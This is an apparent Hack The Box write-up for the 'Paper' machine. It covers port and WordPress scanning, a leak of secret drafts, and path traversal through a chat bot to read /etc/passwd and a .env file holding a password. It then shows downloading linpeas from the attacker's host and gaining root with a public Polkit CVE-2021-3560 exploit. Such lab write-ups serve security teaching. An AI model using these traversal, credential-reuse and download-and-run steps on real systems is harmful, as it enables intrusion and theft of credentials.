https://www.hackthebox.com/achievement/machine/998467/432


# ENUMERATION

### NMAP

```console
noob2uub@kali:~/Documents/HTB/paper$ nmap -sC -sV -A -T4 -p0-65535 10.10.11.143
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 21:00 PDT
Nmap scan report for 10.10.11.143
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.34 seconds
```
Website shows that its, "This page is used to test the proper operation of the HTTP server after it has been installed. If you can read this page it means that this site is working properly. This server is powered by CentOS."

### Nikto

```Console
noob2uub@kali:~/Documents/HTB/paper$ nikto -h 10.10.11.143
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.143
+ Target Hostname:    10.10.11.143
+ Target Port:        80
+ Start Time:         2022-04-07 21:38:31 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8698 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-04-07 21:45:49 (GMT-7) (438 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

I found the uncommon header office.paper and added it to the host file

``` console
127.0.0.1	localhost
127.0.1.1	kali
10.10.11.143   office.paper

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

We may have a few user names: nick
June 20, 2021 at 2:49 pm

Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
-Nick

and looking around I see that it is a word press site, so lets enumerate the site. 

### WP Press Enumeration

```console
noob2uub@kali:/$ wpscan --url http://office.paper/ --enumerate u,ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Thu Apr  7 21:58:11 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2021-07-17T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=========================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] prisonmike
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] nick
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] creedthoughts
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Apr  7 21:58:21 2022
[+] Requests Done: 58
[+] Cached Requests: 6
[+] Data Sent: 14.878 KB
[+] Data Received: 254.476 KB
[+] Memory used: 239.828 MB
[+] Elapsed time: 00:00:10
```

we have a version of Word Press now WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).

### Exploit-DB

```console
So far we know that adding `?static=1` to a wordpress URL should leak its secret content

Here are a few ways to manipulate the returned entries:

- `order` with `asc` or `desc`
- `orderby`
- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format


In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:
```

We get into a hidden page by adding ?static=1

```console


test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!

```

adding chat.office.paper to the host file brings you to a registration page. Sign up and keep moving. 

### Chat Site

``` Console
How to use me ? :
1. Small Talk:
You can ask me how dwight's weekend was, or did he watched the game last night etc.
eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
2. Joke:
You can ask me Why the salesman crossed the road.
eg: 'recyclops why did the salesman crossed the road?'
<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
For security reasons, the access is limited to the Sales folder.
3. Files:
eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
4. List:
You can ask me to list the files
5. Time:
You can ask me to what the time is
eg: 'recyclops what time is it?' or just 'recyclops time'
```
So going though this was abit annoying but i figured out list gives me the directory and I can not open anything that I can tell, but I was about to do a directory traversal. Lets see how far we can take it.

```console
kenosyaj
10:28 PM
recyclops ls -l
recyclops list


recyclops
Bot
10:29 PM
Fetching the directory listing of /sales/
total 0
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
drwx------ 11 dwight dwight 297 Apr 6 13:57 ..
drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2

kenosyaj
kenosyaj
10:29 PM
recyclops man
recyclops cat sale
recyclops nano sale
recyclops list../../../


recyclops
Bot
10:30 PM
Fetching the directory listing of ../../../
total 28
dr-xr-xr-x. 17 root root 244 Jan 17 11:37 .
dr-xr-xr-x. 17 root root 244 Jan 17 11:37 ..
-rw-r--r-- 1 root root 0 Jan 14 06:07 .autorelabel
lrwxrwxrwx 1 root root 7 Jun 22 2021 bin -> usr/bin
dr-xr-xr-x. 4 root root 4096 Jan 14 06:46 boot
drwxr-xr-x 20 root root 3060 Apr 6 10:08 dev
drwxr-xr-x. 145 root root 8192 Apr 6 13:56 etc
drwxr-xr-x. 3 root root 20 Apr 6 13:56 home
lrwxrwxrwx 1 root root 7 Jun 22 2021 lib -> usr/lib
lrwxrwxrwx. 1 root root 9 Jun 22 2021 lib64 -> usr/lib64
drwxr-xr-x. 2 root root 6 Jun 22 2021 media
drwxr-xr-x. 3 root root 18 Jun 22 2021 mnt
drwxr-xr-x. 3 root root 25 Jun 22 2021 opt
dr-xr-xr-x 275 root root 0 Apr 6 06:44 proc
dr-xr-x---. 8 root root 4096 Jan 15 11:56 root
drwxr-xr-x 44 root root 1240 Apr 6 14:14 run
lrwxrwxrwx 1 root root 8 Jun 22 2021 sbin -> usr/sbin
drwxr-xr-x. 2 root root 6 Jun 22 2021 srv
dr-xr-xr-x 13 root root 0 Apr 6 06:44 sys
drwxrwxrwt. 11 root root 4096 Apr 7 22:55 tmp
drwxr-xr-x. 13 root root 158 Jan 14 04:52 usr
drwxr-xr-x. 22 root root 4096 Jan 14 05:58 var
```

Maybe we can find a paswword in etc/passwd

```console
kenosyaj
10:33 PM
recyclops file ../../../../etc/passwd


recyclops
Bot
10:33 PM
<!=====Contents of file ../../../../etc/passwd=====>
root❌0:0:root:/root:/bin/bash
bin❌1:1:bin:/bin:/sbin/nologin
daemon❌2:2:daemon:/sbin:/sbin/nologin
adm❌3:4:adm:/var/adm:/sbin/nologin
lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
sync❌5:0:sync:/sbin:/bin/sync
shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
halt❌7:0:halt:/sbin:/sbin/halt
mail❌8:12:mail:/var/spool/mail:/sbin/nologin
operator❌11:0:operator:/root:/sbin/nologin
games❌12💯games:/usr/games:/sbin/nologin
ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus❌81:81:System message bus:/:/sbin/nologin
systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin
tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd❌998:996:User for polkitd:/:/sbin/nologin
geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin
rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin
qemu❌107:107:qemu user:/:/sbin/nologin
apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin
cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin
pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin
unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
chrony❌993:987::/var/lib/chrony:/sbin/nologin
libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
radvd❌75:75:radvd user:/:/sbin/nologin
clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
sssd❌983:981:User for sssd:/:/sbin/nologin
colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin
rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin
pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
gdm❌42:42::/var/lib/gdm:/sbin/nologin
gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin
insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
tcpdump❌72:72::/:/sbin/nologin
mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
mongod❌976:974:mongod:/var/lib/mongo:/bin/false
rocketchat❌1001:1001::/home/rocketchat:/bin/bash
dwight❌1004:1004::/home/dwight:/bin/bash
<!=====End of file ../../../../etc/passwd=====>
```

I didn't find anything here so I keept searching around working my way back until I found a folder called hubot and found a .env file.

```console
total 36
drwx------ 11 dwight dwight 297 Apr 6 13:57 .
drwxr-xr-x. 3 root root 20 Apr 6 13:56 ..
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 18 Apr 6 13:40 .dbshell
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 3 dwight dwight 69 Apr 6 13:40 .gnupg
drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
-r-------- 1 dwight dwight 33 Apr 6 06:45 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
Fetching the directory listing of ../sales
total 0
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
drwx------ 11 dwight dwight 297 Apr 6 13:57 ..
drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
Fetching the directory listing of ../hubot
total 2292
drwx------ 8 dwight dwight 4096 Sep 16 2021 .
drwx------ 11 dwight dwight 297 Apr 6 13:57 ..
-rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \
srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000
srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080
drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin
-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env
-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json
drwx------ 8 dwight dwight 163 Jul 3 2021 .git
-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore
-rw-r--r-- 1 dwight dwight 1945085 Apr 8 01:41 .hubot.log
-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE
drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules
drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak
-rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json
-rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak
-rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json
-rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile
-rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md
drwx--x--x 2 dwight dwight 193 Jan 13 10:56 scripts
-rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh
drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode
-rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock
cat: /home/dwight/sales/../hubot/readme.md: No such file or directory
<!=====Contents of file ../hubot/README.md=====>
<!=====End of file ../hubot/README.md=====>
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```

### .env file

```console
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=truetrue
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```
I wasn't able to SSH into recoclops account, but the dwight is the owner of the folder, lets see if he shares the same password. 

There is the first flag and nothing really to be seen so far. So lets run linpeas.

### Linpeas

```console
dwight@paper ~]$ wget 10.10.14.5:8080/linpeas.sh   
--2022-04-08 01:58:01--  http://10.10.14.5:8080/linpeas.sh
Connecting to 10.10.14.5:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 765823 (748K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                100%[====================================>] 747.87K  2.76MB/s    in 0.3s    

2022-04-08 01:58:02 (2.76 MB/s) - ‘linpeas.sh’ saved [765823/765823]

[dwight@paper ~]$ ls
bot_restart.sh  hubot  linpeas.sh  sales  user.txt
[dwight@paper ~]$ ./liinpeas.sh
-bash: ./liinpeas.sh: No such file or directory
[dwight@paper ~]$ ./linpeas.sh
-bash: ./linpeas.sh: Permission denied
[dwight@paper ~]$ chmod +x linpeas.sh
[dwight@paper ~]$ ./linpeas.sh
```

```console
                                       ╚════════════════════╝                                                                                                                                                                             
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                                                                                              
Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021                                                                    
lsb_release Not Found
                                                                                                                                                                                                                                           
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                                                 
Sudo version 1.8.29                                                                                                                                                                                                                        

Vulnerable to CVE-2021-3560


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                                                                                         
/home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin                                                                                                                                                 
New path exported: /home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin
```

# Privledge Escalation

### Polkit 0.105-26 0.117-2 - Local Privilege Escalation

https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py

creating the exploit, I copy pasted it into nano through ssh

```console
[dwight@paper ~]$ nano exploit.py
[dwight@paper ~]$ ./exploit.py
-bash: ./exploit.py: Permission denied
[dwight@paper ~]$ chmod +x exploit.py 
[dwight@paper ~]$ ./exploit.py
```
```console
[root@paper dwight]# 
[root@paper dwight]# 
[root@paper dwight]# ls
bot_restart.sh  exploit.py  hubot  linpeas.sh  linpeas.txt  sales  user.txt
[root@paper dwight]# cd root
bash: cd: root: No such file or directory
[root@paper dwight]# cd /root
[root@paper ~]# ls
anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
[root@paper ~]# 
```


